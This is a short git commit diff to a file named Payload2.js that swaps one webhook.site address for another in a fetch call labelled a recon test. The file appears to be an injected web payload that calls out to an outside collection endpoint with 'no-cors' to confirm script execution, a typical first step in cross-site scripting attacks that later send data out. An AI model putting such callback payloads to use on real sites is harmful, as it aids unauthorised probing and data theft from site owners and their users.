97ac22f64f85a79db3ab6dd9f025c71e21370592
Ecar <86429683+Poggiecar@users.noreply.github.com>
2026-04-22 02:18:45 -0300

    Update Payload2.js

--- Payload2.js
+++ Payload2.js
@@ -1,6 +1,6 @@
 (function() {
   // Test 1: fetch
-  fetch('https://webhook.site/1017fe30-0b47-473e-98b3-3badba9b4f69/recon?test=fetch', {
+  fetch('https://webhook.site/4c23dbe0-c117-4105-a0e6-bcfededf662b/recon?test=fetch', {
     method: 'GET',
     mode: 'no-cors'
   });
